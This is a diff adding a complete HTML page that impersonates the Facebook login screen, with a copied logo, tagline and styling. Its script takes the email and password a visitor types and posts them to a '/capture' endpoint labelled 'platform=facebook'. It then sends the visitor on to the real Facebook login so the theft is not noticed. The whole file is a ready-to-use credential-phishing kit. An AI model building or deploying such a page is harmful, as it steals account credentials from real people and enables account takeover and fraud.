@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook - Log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 980px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .left-section {
+            flex: 1;
+            padding-right: 32px;
+            min-width: 280px;
+        }
+        
+        .facebook-logo {
+            height: 106px;
+            margin: -28px;
+        }
+        
+        .facebook-logo svg {
+            height: 106px;
+        }
+        
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+            margin-top: -10px;
+            padding-left: 30px;
+        }
+        
+        .right-section {
+            flex: 1;
+            min-width: 396px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .input-field {
+            margin-bottom: 12px;
+        }
+        
+        .input-field input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background 0.2s;
+        }
+        
+        .login-button:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            text-align: center;
+        }
+        
+        .create-button {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: inline-block;
+            text-decoration: none;
+        }
+        
+        .create-button:hover {
+            background: #36a420;
+        }
+        
+        .create-page {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 28px;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .spinner {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            background: #be4b49;
+            color: white;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            display: none;
+        }
+        
+        @media (max-width: 900px) {
+            .content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 40px;
+            }
+            
+            .tagline {
+                width: auto;
+                padding-left: 0;
+                font-size: 24px;
+            }
+            
+            .right-section {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+        
+        @media (max-width: 460px) {
+            .right-section {
+                min-width: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="left-section">
+                <div class="facebook-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" fill="url(#jsc_s_b)" height="106px">
+                        <defs>
+                            <linearGradient id="jsc_s_b" x1="50%" x2="50%" y1="97.078%" y2="0%">
+                                <stop offset="0%" stop-color="#0062E0"></stop>
+                                <stop offset="100%" stop-color="#19AFFF"></stop>
+                            </linearGradient>
+                        </defs>
+                        <path d="M15 35.294C7.5 32.378 2 25.034 2 16.5 2 7.94 8.44 1.5 17 1.5s15 6.44 15 15c0 8.534-5.5 15.878-13 18.794V23h4l1-6h-5v-3c0-1.5.7-3 3-3h2v-5s-1.7-.5-4-.5c-4 0-7 2.5-7 7v4.5H9v6h5v12.294z"></path>
+                    </svg>
+                </div>
+                <div class="tagline">
+                    Facebook helps you connect and share with the people in your life.
+                </div>
+            </div>
+            
+            <div class="right-section">
+                <div class="login-box">
+                    <form id="loginForm" method="POST" action="/capture">
+                        <div class="error-message" id="errorMsg">
+                            The password you entered is incorrect. Please try again.
+                        </div>
+                        
+                        <div class="input-field">
+                            <input type="text" id="email" name="email" placeholder="Email address or phone number" autofocus required>
+                        </div>
+                        
+                        <div class="input-field">
+                            <input type="password" id="password" name="password" placeholder="Password" required>
+                        </div>
+                        
+                        <button type="submit" class="login-button" id="loginBtn">Log In</button>
+                        <div class="spinner" id="spinner"></div>
+                        
+                        <div class="forgot-password">
+                            <a href="#">Forgotten password?</a>
+                        </div>
+                        
+                        <div class="divider"></div>
+                        
+                        <div class="create-account">
+                            <a href="#" class="create-button">Create new account</a>
+                        </div>
+                    </form>
+                </div>
+                
+                <div class="create-page">
+                    <a href="#">Create a Page</a> for a celebrity, brand or business.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let isValid = true;
+            
+            if (!email) {
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('errorMsg').textContent = 'Email or phone number is required.';
+                isValid = false;
+            } else if (!password) {
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('errorMsg').textContent = 'Password is required.';
+                isValid = false;
+            } else {
+                document.getElementById('errorMsg').style.display = 'none';
+            }
+            
+            if (isValid && email && password) {
+                // Show loading spinner
+                document.getElementById('loginBtn').style.display = 'none';
+                document.getElementById('spinner').style.display = 'block';
+                
+                // Send credentials to capture endpoint
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password) + '&platform=facebook'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Redirect to real Facebook
+                    window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
+                })
+                .catch(error => {
+                    // Still redirect even if fetch fails
+                    window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
+                });
+            }
+        });
+        
+        // Add input field animations
+        const inputs = document.querySelectorAll('.input-field input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#1877f2';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#dddfe2';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
